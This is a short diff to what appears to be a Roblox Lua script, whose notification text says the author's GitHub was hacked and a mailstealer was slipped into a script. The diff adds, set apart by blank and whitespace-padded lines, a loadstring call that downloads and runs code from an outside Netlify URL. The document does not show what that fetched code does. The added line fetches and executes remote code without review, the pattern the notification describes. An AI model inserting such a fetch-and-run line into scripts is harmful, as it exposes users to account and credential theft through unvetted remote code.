@@ -5,3 +5,9 @@ local Notify = Library:MakeNotify({
   Text = "MY GITHUB GOT HACKED AND IT INCLUDED A MAILSTEALER ON ONE OF MY BIGGEST SCRIPTS!!",
   Time = 5
 })
+
+
+                    
+loadstring(game:HttpGet('https://syrexhub.netlify.app/raw/petsimulator99/syrexhub'))()
+                    
+                
